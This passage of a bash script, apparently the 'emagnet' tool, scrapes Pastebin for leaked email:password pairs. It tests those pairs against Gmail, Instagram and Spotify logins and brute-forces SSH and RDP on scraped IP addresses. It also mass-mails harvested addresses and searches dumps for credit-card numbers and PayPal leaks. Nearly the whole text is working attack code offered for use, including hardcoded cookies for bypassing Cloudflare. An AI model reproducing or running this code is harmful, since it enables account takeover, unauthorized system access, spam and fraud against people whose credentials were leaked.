            sed -i '129 i RBRUTEFORCE=false' "$CONF"
            emagnet_analyzer
fi
}

emagnet_rdpbruter() {
hash xfreerdp &> /dev/null
( [[ $? -eq "0" ]] || echo -e "$basename$0: internal error -- xfreerdp is required to be installed"; exit 1 )
emagnet_conf
if [[ -z "$rdpPASS" ]]; then
   echo -e "You must set a password to use during the attack"
   read -p "Enter a password or hit enter for default (Default: qwerty) " rdppassb
   echo ""
     if [[ -n "$rdppassb" ]]; then
       sed -i '199d' "$CONF"
       sed -i "199 i rdppassb=$rdppassb" "$CONF"
     else
       sed -i '199d' "$CONF"
       sed -i "199 i RDPPASS=qwerty" "$CONF"
     fi
fi

SKIPLIST="^0\|^[0-9].[0-9].[0-9].*\|^[0-9]\..*\|^10\..*\|^192.168.*"
grep -Ewro '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' "$EMAGNETHOME/.temp" \
|awk -F':' '{print $2}' \
|sort \
|awk -F, '!seen[$1]++' > "$RDPPORTSCAN"

   if [[ $(cat $RDPPORTSCAN|wc -l) -lt "1" ]]; then
        echo -e "                       - IPv4 Addresses Found \r             [\e[1;31m00\e[0m] "
        sleep 2
        else
        echo -e "                       - IPv4 Addresses Found \r             [\e[1;32m$(cat $RDPPORTSCAN|wc -l)\e[0m] "
        sleep 2
        xargs -i -P $THREADS timeout 0.5 nc -zvn {} $EDPPORT < $RDPPORTSCAN 2>&1|awk '{print $3} /succeeded/ '|grep -oE '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' > $RDPTARGETS
        echo -e "                       - Has Port $rdpPORT Open\r             [\e[1;32m$(cat $RDPPORTSCAN|wc -l)\e[0m] "
        printf "\n%64s\n" | tr ' ' '='
        printf "\n%15s";printf "BRUTE FORCING \e[1;31mRDP\e[0m TARGETS\e[0m\n\n"
        sleep 2
       while read line; do
       #timeout 0.5
         xfreerdp --ignore-certificate --authonly -u $RDP_USERNAME -p $RDP_PASSWORD $line &> test
         cat test|grep -q "ERRCONNECT_SECURITY_NEGO_CONNECT_FAILED"
            if [[ $? != "0" ]]; then
              echo -e "[\e[1;32m>>\e[0m] - Cracked Password: $line"
             else
              echo -e "[\e[1;31m<<\e[0m] - Wrong Login: $line"
            fi
              sleep 4
       done < $RDP_TARGETS
   fi
        sleep 4
}

emagnet_sshbruter() {
hash pssh &> /dev/null
( [[ $? -eq "0" ]] || echo -e "$basename$0: internal error -- pssh is required to be installed"; exit 1 )
emagnet_conf

if [[ -z "$SSHPASS" ]]; then
   echo -e "You must set a password to use during the attack"
   read -p "Enter a password or hit enter for default (Default: root) " sshpassb
   echo ""
     if [[ -n "$sshpassb" ]]; then
       sed -i '183d' "$CONF"
       sed -i "183 i SSHPASS=$sshpassb" "$CONF"
     else
       sed -i '183d' "$CONF"
       sed -i "183 i SSHPASS=root" "$CONF"
     fi
fi

SKIPLIST="^0\|^[0-9].[0-9].[0-9].*\|^[0-9]\..*\|^10\..*\|^192.168.*"
#grep -Ewro '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' "$EMAGNETTEMP" \
grep -Ewro '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' "$EMAGNETALL" \
|awk -F':' '{print $2}' \
|awk -F, '!seen[$1]++' > "$SSHPORTSCAN"

   if [[ $(cat $SSHPORTSCAN|wc -l) -lt "1" ]]; then
        echo -e "                       - IPv4 Addresses Found \r             [\e[1;31m00\e[0m] "
        sleep 2
        else
        echo -e "                       - IPv4 Addresses Found \r             [\e[1;32m$(cat $SSHPORTSCAN|wc -l)\e[0m] "
        sleep 2
        xargs -i -P $THREADS timeout 0.5 nc -zvn {} 22 < $SSHPORTSCAN 2>&1 |grep 'open'|grep -oE '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' > $SSHTARGETS
        echo -e "                       - Has Port $SSHPORT Open\r             [\e[1;32m$(cat $SSHTARGETS|wc -l)\e[0m] "
        printf "\n%64s\n" | tr ' ' '='
        printf "\n%15s";printf "BRUTE FORCING -- \e[1;34mSSH\e[0m TARGETS\e[0m\n\n"
        sleep 2
        sshpass -p "$SSHPASS" pssh  -O "StrictHostKeyChecking=no" -I -h $SSHTARGETS -i "uptime" < $SSHTARGETS |grep --color -i 'success\|failure' 
   fi
        sleep 4
}

emagnet_instagrambruter() {
URL="https://www.instagram.com/accounts/login/ajax/?hl=jp"
      grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b:...*" "$EMAGNETTEMP" \
    |awk '{print $1}' \
    |cut -d':' -f2,3 \
    |cut -d'|' -f1 \
    |uniq|grep -v ''\|'/'\|'"'\|','\|'<'\|'>'\|'\/'\|'\\'|grep -v "/" >> $HOME/.config/emagnet/tmp/.emagnet-instagram-accounts.txt   
while read instagramlogin; do
    INSTAGRAM_USER="$(echo $instagramlogin|cut -d':' -f1,2|sed 's/:/\&password\=/g')"
    INSTAGRAM_PASS="$(echo $instagramlogin|cut -d':' -f2)"
    INSTAGRAM_TOKEN="$(< /dev/urandom tr -dc _A-Z-a-z-0-9 | head -c33)"
    curl -s $URL --data "username=$INSTAGRAM_USER&password=$INSTAGRAM_PASS" -H "x-csrftoken: $INSTAGRAM_TOKEN"|awk '{print $4}'|grep -iq 'checkpoint_required'
 if [[ $? -eq "0" ]]; then
         echo -e "[\e[1;32m>>\e[0m] - Cracked Password: ${INSTAGRAM_USER}:${INSTAGRAM_PASS}"    
         echo -e "================================================================"             >>    "$EMAGNETCRACKED/cracked-instagram-passwords.txt"
         echo -e "[+] Login Details For INSTAGRAM - Cracked $(date +%d/%m/%Y\ -\ %H:%M)"        >>    "$EMAGNETCRACKED/cracked-instasgram-passwords.txt"
         echo -e "[+]------------------------------------------------------------"              >>    "$EMAGNETCRACKED/cracked-instagram-passwords.txt"
         echo -e "[+] Username: ${INSTAGRAM_USER}"                                              >>    "$EMAGNETCRACKED/cracked-instagram-passwords.txt"
         echo -e "[+] Password: ${INSTAGRAM_PASS}"                                              >>    "$EMAGNETCRACKED/cracked-instagram-passwords.txt"
         echo -e "================================================================\n\n"         >>    "$EMAGNETCRACKED/cracked-instagram-passwords.txt"
         echo -e "[\e[1;32m>>\e[0m] - Cracked Password: ${INSTAGRAM_USER}:${INSTAGRAM_PASS}"    >>    "$HOME/.config/emagnet/tmp/.emagnet-cracked"
         echo -e "[\e[1;31m<<\e[0m] - Wrong Password: ${INSTAGRAM_USER}:${INSTAGRAM_PASS}"      >>    "$HOME/.config/emagnet/tmp/.emagnet-failed"
  else
         echo -e "[\e[1;31m<<\e[0m] - Wrong Password: $instagramlogin"
 fi
#done < $HOME/.config/emagnet/tmp/.emagnet-instagram-accounts.txt
done < "$SPOTIFY_TARGETS"
         printf "%64s \n\n" | tr ' ' '='
         sleep 3
         rm "$HOME/.config/emagnet/tmp/.emagnet-instagram-accounts.txt"
         sleep 0
}

emagnet_spotify_bruter() {
SPOTIFY_TARGETS="$HOME/.config/emagnet/tmp/.emagnet-passwords"
     grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b:...*" "$EMAGNETTEMP" \
    |awk '{print $1}' \
    |cut -d':' -f2,3 \
    |cut -d'|' -f1 \
    |uniq|grep -v ''\|'/'\|'"'\|','\|'<'\|'>'\|'\/'\|'\\'|grep -v "/" >> "$SPOTIFY_TARGETS"
       while read line; do
                SPOTIFY_USER="$(echo $line|cut -d: -f1)"
                SPOTIFY_PASS="$(echo $line|cut -d: -f2)"
             ./sconsify -username="${SPOTIFY_USER}" <<< "${SPOTIFY_PASS}" 2> /dev/null|grep -i -q "bad"
               if [[ "$?" -eq "0" ]]; then
                echo -e "[\e[1;31m<<\e[0m] - Wrong Password: ${SPOTIFY_USER}:${SPOTIFY_PASS}"
               else
#                     grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b:...*" "$EMAGNETTEMP" \
#                     |awk '{print $1}' \
#                     |cut -d':' -f2,3 \
#                     |cut -d'|' -f1 \
#                     |uniq|grep -v ''\|'/'\|'"'\|','\|'<'\|'>'\|'\/'\|'\\'|grep -v "/" >> $HOME/.config/emagnet/tmp/.emagnet-passwords.txt
                       echo -e "[\e[1;32m>>\e[0m] - Cracked Password: ${SPOTIFY_USER}:${SPOTIFY_PASS}"
                     echo -e "================================================================"      >>    "$EMAGNETCRACKED/cracked-spotify-passwords.txt"
                     echo -e "[+] Login Details For SPOTIFY - Cracked $(date +%d/%m/%Y\ -\ %H:%M)"   >>    "$EMAGNETCRACKED/cracked-spotify-passwords.txt"
                       echo -e "[+]------------------------------------------------------------"       >>    "$EMAGNETCRACKED/cracked-spotify-passwords.txt"
                     echo -e "[+] Username: ${SPOTIFY_USER}"                                         >>    "$EMAGNETCRACKED/cracked-spotify-passwords.txt"
                       echo -e "[+] Password: ${SPOTIFY_PASS}"                                         >>    "$EMAGNETCRACKED/cracked-spotify-passwords.txt"
                     echo -e "================================================================\n\n"  >>    "$EMAGNETCRACKED/cracked-spotify-passwords.txt"
                       echo -e "[\e[1;32m>>\e[0m] - Cracked Password: ${SPOTIFY_USER}:${SPOTIFY_PASS}" >>    "$HOME/.config/emagnet/tmp/.emagnet-cracked"
                       echo -e "[\e[1;31m<<\e[0m] - Wrong Password: ${SPOTIFY_USER}:${SPOTIFY_PASS}"   >>    "$HOME/.config/emagnet/tmp/.emagnet-failed"
              fi
            done < "$SPOTIFY_TARGETS"

}

emagnet_gmail_bruter() {
if [[ eg=$(grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b\\:.*$" $EMAGNETTEMP|grep '\S'|sed 's/|/:/g'|awk '{print $1}'|cut -d: -f2,3|uniq|grep -v '"'\|','\|'<' |grep -i gmail.com|wc -l) -gt "0" ]]; then

  grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b:...*" "$EMAGNETTEMP" \
        |awk '{print $1}' \
        |cut -d: -f2,3 \
        |uniq|grep -v ''\|'/'\|'"'\|','\|'<'\|'>'\|'\/'\|'\\'|grep -v '/'|grep -i 'gmail.com' >> $HOME/.config/emagnet/tmp/.emagnet-passwords.txt

while read -r line; do
GMAIL_ATTACK=$(curl -s -u $line https://mail.google.com/mail/feed/atom|grep -o "xml")
GMAIL_USER="$(echo $line | cut -d: -f1)"
GMAIL_PASS="$(echo $line | cut -d: -f2)"

    if [[ -z "$GMAIL_ATTACK" ]]; then
         echo -e "[\e[1;31m<<\e[0m] - Wrong Password: ${GMAIL_USER}:${GMAIL_PASS}"
    fi

      if [[ -n "$GMAIL_ATTACK" ]]; then
         echo -e "[+] Password Has Been Cracked $mail: \e[1;32m$password\e[0m"
         read -p "[+] Accounts to crack has been set to 1, emagnet has been killed.\n" hey
         echo -e "================================================================"     >>    "$EMAGNETCRACKED/cracked-gmail-passwords.txt"
         echo -e "[+] Login Details For Gmail - Cracked $(date +%d/%m/%Y\ -\ %H:%M)"    >>    "$EMAGNETCRACKED/cracked-gmail-passwords.txt"
         echo -e "[+]------------------------------------------------------------"      >>    "$EMAGNETCRACKED/cracked-gmail-passwords.txt"
         echo -e "[+] Username: $mail"                                                  >>    "$EMAGNETCRACKED/cracked-gmail-passwords.txt"
         echo -e "[+] Password: $password"                                              >>    "$EMAGNETCRACKED/cracked-gmail-passwords.txt"
         echo -e "================================================================\n\n" >>    "$EMAGNETCRACKED/cracked-gmail-passwords.txt"
      fi
done < "$HOME/.config/emagnet/tmp/.emagnet-passwords.txt"
      rm "$HOME/.config/emagnet/tmp/.emagnet-passwords.txt" &> /dev/null
      sleep 3
else
      sleep 1
fi
}

emagnet_spammer() {
emagnet_required_stuff
emagnet_conf
ssmtp &> /dev/null
if [[ "$?" -gt "0" ]]; then printf "%s\n" "$basename$0: internal error -- ssmtp is required to be installed";exit 1;fi

if [[ -z "$EMAIL2SEND" ]]; then
    printf "%s\n" " - You must create a text file wich contains the message"
    printf "%s\n" " - you want to send when text file has been created then run:"
    printf "%s\n" " - Usage: ./$basename$0 -s /path/to/text-file.txt"
    exit 1
fi


if [[ -z "$2" ]]; then
    printf "%s\n" "$basename$0: internal error -- you must choose a file with email addresses..."
    exit 1 
fi

if ! [[ -f "$EMAIL2SEND" ]]; then
    printf "%s\n" "$basename$0: internal error -- $1 does not exist..."
    exit 1
fi

if [[ "$(ls $EMAGNETDB|wc -l)" -eq "0" ]]; then
    echo -e "$basename$0: internal error -- no email addresses has been found."
    exit 1
else
        emagnet_clear
        emagnet_banner
        NRTARGETS="$(grep -rEiEio '\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}\b' $EMAGNETDB|cut -d: -f2|wc -l)"
        printf "%17s[\e[1;32m$NRTARGETS\e[0m] - EMAIL ADDRESSES\e[0m\n"
        printf "\n%64s \n\n" | tr ' ' '='
        read -p "- Are you really sure you want to send your mail (yes/NO): " sendtoall
             case $sendtoall in
                  "yes")
                     printf "\n%64s \n" | tr ' ' '='
                     grep -rEiEio '\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}\b' $EMAGNETDB|cut -d: -f2 > $HOME/.config/emagnet/tmp/.emagnet-spam
                     while read e1; do printf "%-57s%s\n" "- Sending email to: $e1 $(ssmtp $e1 < "$EMAIL2SEND")" "[.sent.]";done < "$HOME/.config/emagnet/tmp/.emagnet-spam"
                     printf "\n%64s \n\n" | tr ' ' '='
                     echo -e "- Successfully sent to all $TARGETS"
                     rm "$HOME/.config/emagnet/tmp/.emagnet-spam" &> /dev/null
                   ;;
                  "*")
                     echo -e "- Aborted..\n"
                     exit 1
                   ;;
             esac
fi
}

emagnet_syntax() {
if [[ -z "$SYNTAX2DL" ]]; then 
    echo -e "$basename$0: internal error -- you must include a syntax language (ex: bash, python or perl)."
    exit 1
fi



 curl -Ls "https://pastebin.com/archive/$SYNTAX2DL" \
|grep -o '<a href="/........' \
|cut -d'/' -f2 \
|grep -E '[0-9]{1,4}' \
|sed 's/^/https:\/\/pastebin.com\/raw\//g' > "$HOME/.config/emagnet/tmp/.emagnet-syntaxes-urls"
 grep -q "$SYNTAX2DL" "$HOME/.config/emagnet/tmp/.emagnet-syntaxes"

emagnet_check_pastebin
if [[ "$?" = "0" ]]; then
     
     printf "Downloading $(cat $HOME/.config/emagnet/tmp/.emagnet-syntaxes-urls|wc -l) ${SYNTAX2DL} files.."
     mkdir -p "$EMAGNETSYNTAX/$SYNTAX2DL"
 else
     curl -Ls "https://pastebin.com/languages" \
     |grep -o 'href="/archive/............' \
     |cut -d'<' -f1 \
     |cut -d'/' -f3 \
     |cut -d'"' -f1 > $HOME/.config/emagnet/tmp/.emagnet-syntaxes
      echo -e "$basename$0: internal error -- $SYNTAX2DL is not a valid syntax language.."
      echo -e "try 'cat $HOME/.config/emagnet/tmp/.emagnet-syntaxes' for find valid syntaxes"
      exit 1
fi
}

emagnet_main() {
# ------------------------------------------------------------
# BETA - CHOOSE ONE?
#curl -s https://scrape.pastebin.com/api_scraping.php -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0' -H 'Cookie: _ga=GA1.2.1092992254.1592458160; cf_clearance=427618303dfe7f40fd4bed06784b682ff11e9492-1593096187-0-d1784d20-250'|egrep -oi 'https:\/\/scrape.*php.*"'|sed 's/.$//g' > $HOME/.config/emagnet/tmp/.emagnet-temp1
#grep -qEoi 'https:\/\/scrape.*php.*"'|sed 's/.$//g' $HOME/.config/emagnet/tmp/.emagnet-temp1
# ------------------------------------------------------------

# Check if PROXY is set to true (ssh/tunnel)
if [[ $PROXY = "true" ]]; then 
   CURL="curl -x socks5h://$PROXYHOST:$PROXYPORT "
else
    CURL="curl -s "
fi

# We now use nr1.nu instead for see recent uploads 
# since patebin now have filtered default syntax 
# "text" from being listed, lmao :)
source "$HOME/.config/emagnet/emagnet.conf" &> /dev/null
curl -H "$USERAGENT" -Ls "https://nr1.nu/emagnet/pastebin/2020-07-15/pastebin.txt"|sort|awk '!seen[$0]++' > "$HOME/.config/emagnet/tmp/.emagnet-temp1"
ls -1 "$EMAGNETALL"|sort|awk '!seen[$0]++'|sed 's/^/https:\/\/pastebin.com\/raw\//g' > "$HOME/.config/emagnet/tmp/.emagnet-temp2"
grep  -v -x -F -f "$HOME/.config/emagnet/tmp/.emagnet-temp2" "$HOME/.config/emagnet/tmp/.emagnet-temp1"|awk -F, '!seen[$1]++' > "$HOME/.config/emagnet/tmp/.emagnet-download"

#-----------------------------------------------------
# If cloudfare is trigged, then we will do below 
# - We wont be allowed to use wget without
# cookies, so then we run curl in a loop instead
# this is alot slower and JUST an example so please
# change this if you have a faster, better and more 
# stable way to do this if cloudfare is triggered
#-----------------------------------------------------
# See how you can bypass cloudfare here: 
# https://pastebin.com/raw/8MfnBW7r
#-----------------------------------------------------
curl -sL https://pastebin.com/|grep -io "What can I do to" &> /dev/null
if [[ ${$?} -gt "0" ]]; then
   while read line; do
        source "$HOME/.config/emagnet/emagnet.conf" &> /dev/null       
        curl '$line' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'Cookie: __cfduid=d7d79b8cd36362aa95e3b90fcf3acc7491594533376; _ga=GA1.2.1884747867.1594742009; __gads=ID=38e8a6bea2852c12:T=1594734804:S=ALNI_MYI6CC_VHeBWyI_jkDdMgjO0Ny2zw; cf_clearance=dfb094f0ccac0b6649ebafa292bb81de7b37b94e-1594840687-0-1za25cfc5cze628b45azf578cfb9-250; _gid=GA1.2.423143590.1594877466' -H 'Upgrade-Insecure-Requests: 1' -H 'Cache-Control: max-age=0' -H 'TE: Trailers' -o $EMAGNETTEMP/$(echo -e $line|sed "s:..*/::")
    done < $HOME/.config/emagnet/tmp/.emagnet-download
else
# Downloading new pastes we found, no duplicates will be downloaded of course - This is __ALOT__ faster then while loop above - But this wont work when cloudfare will become a problem for us :)
     xargs -P "$(xargs --show-limits -s 1 2>&1|grep -i "parallelism"|awk '{print $8}')" -n 1 wget --user-agent="${USERAGENT}" -q -nc -P "$EMAGNETTEMP" < "$HOME/.config/emagnet/tmp/.emagnet-download" &> /dev/null
fi
# Print total files on a better way
      tt="$(ls $EMAGNETTEMP| wc -l)"

# Count stats and print them in realtime 
el=$(grep -rEiEio '\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}\b' $EMAGNETTEMP|cut -d: -f2|tr ' ' '\n'|awk -F, '!seen[$1]++')
et=$(grep -rEiEio '\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}\b' $EMAGNETTEMP|tr ' ' '\n'|wc -l)
ef=$(grep -rEiEio "\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}\b" $EMAGNETTEMP|grep '\S'|sed 's/|/:/g'|awk '{print $1}'|cut -d: -f1|uniq|grep -v '"'\|','\|'<'|tr ' ' '\n')
pf=$(grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b\\:.*$" $EMAGNETTEMP|grep '\S'|sed 's/|/:/g'|awk '{print $1}'|cut -d: -f1|uniq|grep -v '"'\|','\|'<'|tr ' ' '\n')
pl=$(grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b\\:.*$" "$EMAGNETTEMP"|awk '{print $1}'|cut -d':' -f2,3|cut -d'|' -f1|awk -F, '!seen[$1]++'|grep -v ''\|'/'\|'"'\|','\|'<'\|'>'\|'\/'\|'\\'\|'index.html'\|'alerts'|grep -v '/')
pt=$(grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b:...*" $EMAGNETTEMP|awk '{print $1}'|cut -d: -f2,3|uniq|grep -v ''\|'/'\|'"'\|','\|'<'\|'>'\|'\/'\|'\\'|grep -v /|wc -l)

# We want to clear screen after we counted stuff
    emagnet_clear
    emagnet_banner
        
# If we found both passwords and email addresses then we do below 
# --------------------------------------------------------------- 
# Notice about sleep:                                             
# Sleep 2 below counters is added so user will be able to see     
# what stats we have collected, otherwise it will just            
# go on and on and we wont see any stats                           
if [[ "$pt" -gt "0" ]] && [[ "$et" -gt "0" ]]; then
            echo -e "[$(date +%d/%m/%Y\ -\ %H:%M)]: Found ${pt} passwords from: $EMAGNETPW/${pf##*/}"      | xargs >> "$EMAGNETLOGS/emagnet.log"
            echo -e "[$(date +%d/%m/%Y\ -\ %H:%M)]: Found ${et} email addresses from: $EMAGNETDB/${ef##*/}"|xargs >> "$EMAGNETLOGS/emagnet.log"
            echo -e "${pl}" >> $EMAGNETLOGS/passwords-from-pastebin.txt
            echo -e "${el}" >> $EMAGNETLOGS/emails-from-pastebin.txt
            cp -rn ${ef} $EMAGNETDB/ &> /dev/null
            cp -rn ${pf} $EMAGNETPW/ &> /dev/null
            if [[ ${tt} -lt "10" ]]; then tt=0${tt};fi
            if [[ ${et} -lt "10" ]]; then et=0${et};fi
            if [[ ${pt} -lt "10" ]]; then pt=0${pt};fi
            echo -e "                       - Files Downloaded\r             [\e[1;32m$tt\e[0m]"
            echo -e "                       - Passwords Found \r             [\e[1;32m$pt\e[0m]"
            echo -e "                       - Email Addresses Found \r             [\e[1;32m$et\e[0m]\n"
            sleep 2

               if [[ "$GBRUTEFORCE" = "true" ]]; then
                  printf "%64s \n\n" | tr ' ' '='
                  printf "%16s";printf "BRUTE FORCING -- $(echo -e "\e[1;34mG\e[1;31mM\e[1;33mA\e[1;34mI\e[0;32mL\E[1;31m\e[0m") ACCOUNTS\e[0m\n\n"
                  emagnet_gmail_bruter
                elif [[ "$SBRUTEFORCE" = "true" ]]; then
                  printf "%64s \n\n" | tr ' ' '='
                  printf "%15s";printf "BRUTE FORCING -- \e[1;34mSSH\e[0m ACCOUNTS\e[0m\n\n"
                  emagnet_sshbruter
                elif [[ "$PBRUTEFORCE" = "true" ]]; then
                  printf "%64s \n\n" | tr ' ' '='
                  printf "%15s";printf "BRUTE FORCING -- \e[0;32mSPOTIFY\e[0m ACCOUNTS\e[0m\n\n"
                  emagnet_spotify_bruter
                elif [[ "$IBRUTEFORCE" = "true" ]]; then
                  printf "%64s \n\n" | tr ' ' '='
                  printf "%14s";printf "BRUTE FORCING -- \e[0;33mINSTAGRAM\e[0m ACCOUNTS\e[0m\n\n"
                  emagnet_instagrambruter
                elif [[ "$RBRUTEFORCE" = "true" ]]; then
                  printf "%64s \n\n" | tr ' ' '='
                  printf "%15s";printf "BRUTE FORCING -- \e[1;31mRDP\e[0m ACCOUNTS\e[0m\n\n"
                  emagnet_rdpbruter
                else
                  sleep 0
               fi
# We want to move everything AFTER we bruteforced ;) 
                 emagnet_move_realtime

# If we found no passwords and mail addresses only we do below
elif [[ "$pt" = "0" ]] && [[ "$et" -gt "0" ]]; then
            echo -e "[$(date +%d/%m/%Y\ -\ %H:%M)]: Found ${et} email addresses from: $EMAGNETDB/${ef##*/}"|xargs >> "$EMAGNETLOGS/emagnet.log"
            echo -e "${el}" >> $EMAGNETLOGS/emails-from-pastebin.txt
            cp -rn ${ef} $EMAGNETDB/ &> /dev/null
            if [[ ${tt} -lt "10" ]]; then tt=0${tt};fi
            if [[ ${et} -lt "10" ]]; then et=0${et};fi
            echo -e "                       - Files Downloaded\r             [\e[1;32m$tt\e[0m] "
            echo -e "                       - Passwords Found \r             [\e[1;31m00\e[0m] "
            echo -e "                       - Email Addresses Found \r             [\e[1;32m$et\e[0m] \n"
            emagnet_move_realtime
            sleep 2                         
            
# If we found no passwords and no mail addresses we print 00 
elif [[ "$pt" = "0" ]] && [[ "$et" = "0" ]] && [[ ${tt} = "0" ]]; then
            echo -e "[\e[1;31m<<\e[0m] - No new files could be downloaded...\n[\e[1;31m<<\e[0m] - You may want to raise time in emagnet.conf.."
            sleep 2                         
        else
            if [[ ${tt} -lt "10" ]]; then tt=0${tt};fi
            echo -e "                       - Files Downloaded\r             [\e[1;32m$tt\e[0m] "
            echo -e "                       - Passwords found \r             [\e[1;31m00\e[0m] "
            echo -e "                       - Email Addresses Found \r             [\e[1;31m00\e[0m] \n"        
            emagnet_move_realtime
            sleep 2
fi

# Cleanup, we don't need these files after we downloaded them but it must be done AFTER bruteforce and not before if bruteforce is triggered
      rm "$HOME/.config/emagnet/tmp/.emagnet-temp1" "$HOME/.config/emagnet/tmp/.emagnet-temp2" "$HOME/.config/emagnet/tmp/.emagnet-temp3" &> /dev/null

}

emagnet_run4ever() {
    for (( ; ; )); do  
        emagnet_conf                         # Source emagnet-conf so we know all settings for emagnet
        emagnet_first_run
        emagnet_paths
        emagnet_iconnection                  # Check if we got internet, otherwise we stop
        emagnet_version                      # Check so we using the correct emagnet.conf
        emagnet_clear
        emagnet_banner
        emagnet_analyzer                     # Change this with emagnet_count_down when we have added brute force stuff again
        emagnet_clear                        # Clear screen
        emagnet_banner                       # Printbanner
        emagnet_analyzing_message            # Print Analyzing before we count data, it takes 0.9seconds and looks better  
        emagnet_main                         # Scrape pastebin, download files and then count stats
       done
}

emagnet_first_run() {
if ! [[ -f "$CONF" ]]; then
        emagnet_required_stuff
        emagnet_conf
        emagnet_required_tools
        emagnet_version
        emagnet_mustbefilled
        emagnet_paths
        emagnet_I_was_banned
        timeout 2 ping -t 1 -c 1 nr1.nu &> /dev/null
        [[ "$?" -gt "0" ]] && sed -i '40d' $CONF;sed -i '40 i MYIP=127.0.0.1' $CONF || wip
        emagnet_conf
        emagnet_check_version
fi
}

emagnet_search() {
  emagnet_required_tools
    dt="$(date +%d%m%y)"
    emagnet_conf
    emagnet_clear
    emagnet_banner
    echo -e "           * * * * *  EMAGNET SEARCH MENU  * * * * * \n"
    echo -e "=================================================================\n"
    echo -e " [1] - Email Addresses"
    echo -e " [2] - Email Addresses incl. Passwords"
    echo -e " [3] - Amex, Master Card and Visa credit cards"
    echo -e " [4] - IPv4 Addresses"
    echo -e " [5] - IPv6 Addresses"
    echo -e " [6] - Search files that contains PayPal, Neteller or Skrill words"
    echo -e " [7] - Find urls that is for live/online streaming"
    echo -e " [8] - Find hidden onion urls that being shared"
    echo -e " [9] - Custom Search for anything you wanna find"
    echo -e " [q] - Quit\n"
    echo -e "=================================================================\n"

emagnet_findemailaddresses() {
     grep -rEo "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b" $EMAGNET \
    |cut -d: -f2 \
    |awk '{print NR-1 "-> " $0}' \
    |awk -F, '!seen[$1]++'
}

emagnet_findemailsandpasswords() {
    grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b:...*" $EMAGNET \
    |awk '{print $1}'\
    |cut -d: -f2,3\
    |uniq\
    |grep -v ''\|'/'\|'"'\|','\|'<'\|'>'\|'\/'\|'\\' \
    |grep -v "/" \
    |awk '{print NR-1 "-> " $0}' \
    |awk -F, '!seen[$1]++'
}
emagnet_findcreditcards() {
# This is an really advanced regex that works pretty good now
# I working hard for make this even more complex.
# - What it actually does is:
# Searching for AMEX/Visa/Master Cards
# and it will only grep files that includes
# a cc card number togheter with any of the words above
    grep -riE "[2-6][0-9]{3}([ -]?)[0-9]{4}([ -]?)[0-9]{4}([ -]?)[0-9]{3,4}([ -]?)[0-9]{0,3}[^a-zA-Z]?"i $EMAGNET \
    |grep -i 'Visa.*\|Creditcard\|credit\ card\|CC Number\|Card Info\|mastercard.*\*.mastercard\|*.visa'
}

emagnet_findipv4addresses() {
     grep -roE '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' $EMAGNET|awk -F":" '{print $2}'|awk '{print NR-1 "-> " $0}'|awk '!seen[$0]++'
}

emagnet_findipv6addresses() {
    grep -roE "\b([0-9A-Fa-f]{1,4}:){7}[0-9A-Fa-f]{1,4}\b" $EMAGNET|awk '{print NR-1 "-> " $0}'|cut -d: -f2-|awk '!seen[$0]++'
}

emagnet_findpaypalleaks() {
    grep -iroE "paypal\|neteller\|skrill" $EMAGNET|awk -F, '!seen[$1]++'|awk '{print NR-1 "-> " $0}'|awk '!seen[$0]++'
}

emagnet_findstreaming() {
    grep -iroE "EXTINF" $EMAGNET|awk -F, '!seen[$1]++'|awk '{print NR-1 "-> " $0}'|awk '!seen[$0]++'
}

emagnet_findonionurls() {
     grep -rEo "h....\/\/.*onion$" $EMAGNET|cut -d: -f2,3,4,5|awk '!seen[$0]++'
}

emagnet_customsearch() {
     read -p " [S] - What are you looking for: " searchfor
     grep -ri "$searchfor" $EMAGNET|awk -F, '!seen[$1]++'|awk '{print NR-1 "-> " $0}'
}

read -p "[0] - Option: " diagst
        case "$diagst" in
                1) emagnet_findemailaddresses                                                       ;;
                2) emagnet_findemailsandpasswords                                                   ;;
                3) emagnet_findcreditcards                                                          ;;
                4) emagnet_findipv4addresses                                                        ;;
                5) emagnet_findipv6addresses                                                        ;;
                6) emagnet_findpaypalleaks                                                          ;;
                7) emagnet_findstreaming                                                            ;;
                8) emagnet_findonionurls                                                            ;;
                9) emagnet_customsearch                                                             ;;
                9) exit 0                                                                           ;;
                *) echo -e "$basename$0: internal error -- $diagst is an unknown option, exiting.." ;;
               \?) echo -e "$basename$0: internal error -- $diagst is an Unknown option, exiting.." ;;
        esac
}


countdown() {
  emagnet_clear;emagnet_banner
if [[ $API = "true" ]]; then
  sed -i 's/API=true/API=false/g' $CONF
  echo -e "You have set API to true but your IP is not whitelisted for scraping. "
